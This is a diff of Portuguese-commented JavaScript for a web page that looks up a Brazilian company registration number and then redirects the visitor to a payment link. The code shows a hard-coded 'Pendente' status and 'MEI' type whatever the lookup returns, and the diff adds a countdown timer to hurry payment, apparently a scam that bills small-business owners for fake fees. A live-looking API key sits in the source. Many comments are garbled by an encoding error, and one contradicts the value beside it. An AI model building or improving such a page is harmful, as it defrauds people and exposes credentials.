@@ -1,13 +1,14 @@
-// ===== VARIÁVEIS GLOBAIS =====
+// ===== VARIÃVEIS GLOBAIS =====
         let currentStep = 1;
         let cnpjData = null;
         let isProcessing = false;
+        // Variáveis de controle de estado (mantidas)
 
-        // Configurações da API CNPJjá
-        const API_BASE_URL = 'https://api.cnpja.com/office'; // Mantido, mas o endpoint correto é 'https://api.cnpja.com/office/{cnpj}'
-        const API_KEY = 'f06b18a7-2e66-4c14-af4f-0b1336575bd3-b139542f-bb82-4a3b-9fe2-f480d404ceb9'; // Chave fornecida pelo usuário
+        // ConfiguraÃ§Ãµes da API CNPJjÃ¡
+        const API_BASE_URL = 'https://api.cnpja.com/office'; // Mantido, mas o endpoint correto Ã© 'https://api.cnpja.com/office/{cnpj}'
+        const API_KEY = 'f06b18a7-2e66-4c14-af4f-0b1336575bd3-b139542f-bb82-4a3b-9fe2-f480d404ceb9'; // Chave fornecida pelo usuÃ¡rio
 
-        // ===== UTILITÁRIOS =====
+        // ===== UTILITÃRIOS =====
         function debounce(func, delay) {
             let timeoutId;
             return function (...args) {
@@ -27,7 +28,7 @@
             }
         }
 
-        // ===== NAVEGAÇÃO ENTRE ETAPAS =====
+        // ===== NAVEGAÃ‡ÃƒO ENTRE ETAPAS =====
         function goToStep(stepNumber) {
             const steps = document.querySelectorAll('.step-content');
             const progressSteps = document.querySelectorAll('.step');
@@ -60,7 +61,7 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ===== MÁSCARA DE CNPJ =====
+        // ===== MÃSCARA DE CNPJ =====
         function applyCNPJMask(value) {
             return value
                 .replace(/\D/g, '')
@@ -95,9 +96,9 @@
             }
 
             try {
-                const url = `${API_BASE_URL}/${cnpj}`; // Corrigido para o endpoint oficial da CNPJá (Receita Federal)
+                const url = `${API_BASE_URL}/${cnpj}`; // Corrigido para o endpoint oficial da CNPJÃ¡ (Receita Federal)
         const headers = {
-           'Authorization': API_KEY, // Removido 'Bearer ' conforme documentação da CNPJá            'Content-Type': 'application/json'
+           'Authorization': API_KEY, // Removido 'Bearer ' conforme documentaÃ§Ã£o da CNPJÃ¡            'Content-Type': 'application/json'
         };
 
         const response = await fetch(url, { headers: headers,
@@ -109,11 +110,11 @@
                 await new Promise(resolve => setTimeout(resolve, 400));
 
 if (!response.ok || data.error) {
-            const errorMessage = data.message || data.error || 'CNPJ não encontrado ou inválido. Verifique a chave de API.';
+            const errorMessage = data.message || data.error || 'CNPJ não encontrado ou inválido.';
             throw new Error(errorMessage);
         }
 
-                // A CNPJjá retorna os dados diretamente no corpo da resposta
+                // A CNPJjÃ¡ retorna os dados diretamente no corpo da resposta
                 cnpjData = data;
                 displayCNPJInfo(data, cnpjInput.value);
                 cnpjInput.classList.add('success');
@@ -121,7 +122,8 @@ if (!response.ok || data.error) {
                 if (errorEl) errorEl.classList.remove('show');
                 cnpjInfoDisplay.style.display = 'block';
                 waitingPayment.style.display = 'block';
-                showSuccessNotification('CNPJ encontrado com sucesso!');
+                startCountdown();
+                showSuccessNotification();
 
                 
 
@@ -147,8 +149,8 @@ if (!response.ok || data.error) {
 
 const infoItems = [
 { label: 'CNPJ', value: formattedCnpj || data.cnpj || '-' },
-					                { label: 'Situação Cadastral', value: 'Pendente' },
-				                // Removido: Data da Situação
+					                { label: 'Formalização', value: '<span class="status-pending">Pendente</span>' },
+				                // Removido: Data da SituaÃ§Ã£o
 				                { label: 'Razão Social', value: data.company?.name || data.name || '-' },
 				                // Removido: Nome Fantasia
 				                { label: 'Natureza Jurídica', value: 'MEI' },
@@ -171,6 +173,42 @@ const infoItems = [
             if (paymentCnpjInfoGrid) paymentCnpjInfoGrid.innerHTML = htmlContent;
         }
 
+        // ===== LÓGICA DE CONTAGEM REGRESSIVA =====
+        let countdownInterval;
+        const initialTimeSeconds = 43 * 60 + 27; // 3:35 em segundos
+
+        function startCountdown() {
+            let timeRemaining = initialTimeSeconds;
+            const timerDisplay = document.getElementById('countdownTimer');
+
+            function updateTimer() {
+                const minutes = Math.floor(timeRemaining / 60);
+                const seconds = timeRemaining % 60;
+                
+                const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                
+                if (timerDisplay) {
+                    timerDisplay.textContent = formattedTime;
+                }
+
+                if (timeRemaining <= 0) {
+                    clearInterval(countdownInterval);
+                    // Opcional: Adicionar lógica para o que acontece quando o tempo acaba (ex: bloquear)
+                    console.log();
+                } else {
+                    timeRemaining--;
+                }
+            }
+
+            // Garante que o timer comece imediatamente
+            updateTimer();
+            countdownInterval = setInterval(updateTimer, 1000);
+        }
+
+        // A contagem regressiva deve ser iniciada quando o alerta de pagamento é exibido.
+        // O alerta é exibido dentro de handleCNPJLookup na linha 124.
+        // Vamos adicionar a chamada para startCountdown() lá.
+
         function showCNPJError(message) {
             const cnpjInput = document.getElementById('cnpj');
             const errorEl = document.getElementById('cnpjError');
@@ -187,10 +225,10 @@ const infoItems = [
             waitingPayment.style.display = 'none';
         }
 
-        // ===== HANDLERS DE FORMULÁRIO =====
+        // ===== HANDLERS DE FORMULÃRIO =====
         function handleCNPJFormSubmit(e) {
             e.preventDefault();
-            // A busca agora é acionada ao preencher o campo ou clicar em Prosseguir
+            // A busca agora Ã© acionada ao preencher o campo ou clicar em Prosseguir
         }
 
         async function handleConfirmationSubmit(e) {
@@ -224,16 +262,16 @@ const infoItems = [
                 window.location.href = 'https://pay.pag-br.com/r/0S1HF964A1ji8335';
             } catch (error) {
                 console.error('Erro:', error);
-                alert('Erro ao processar solicitação. Tente novamente.');
+                alert('Erro ao processar. Tente novamente.');
             } finally {
                 if (submitBtn) submitBtn.classList.remove('btn-loading');
                 if (loadingOverlay) loadingOverlay.style.display = 'none';
             }
         }
 
-        // ===== INICIALIZAÇÃO =====
+        // ===== INICIALIZAÃ‡ÃƒO =====
         document.addEventListener('DOMContentLoaded', function() {
-            // Formulário CNPJ
+            // FormulÃ¡rio CNPJ
             const cnpjForm = document.getElementById('cnpjForm');
             if (cnpjForm) {
                 cnpjForm.addEventListener('submit', handleCNPJFormSubmit);
@@ -244,13 +282,13 @@ const infoItems = [
                         if (cnpjData) { // Verifica se os dados do CNPJ foram carregados
                             goToStep(2);
                         } else {
-                            showCNPJError('Por favor, digite um CNPJ válido para a busca antes de prosseguir.');
+                            showCNPJError('Por favor, digite um CNPJ válido antes de prosseguir.');
                         }
                     });
                 }
             }
 
-            // Máscara de CNPJ
+            // MÃ¡scara de CNPJ
             const cnpjInput = document.getElementById('cnpj');
             if (cnpjInput) {
                 cnpjInput.addEventListener('input', function(e) {
@@ -264,14 +302,14 @@ const infoItems = [
                         e.target.setSelectionRange(newCursorPosition, newCursorPosition);
                     }
 
-                    // Busca automática quando CNPJ está completo
+                    // Busca automÃ¡tica quando CNPJ estÃ¡ completo
                     if (newValue.replace(/\D/g, '').length === 14) {
                         handleCNPJLookup();
                     }
                 });
             }
 
-            // Formulário de Confirmação
+            // FormulÃ¡rio de ConfirmaÃ§Ã£o
             const confirmationForm = document.getElementById('confirmationForm');
             if (confirmationForm) {
                 confirmationForm.addEventListener('submit', handleConfirmationSubmit);
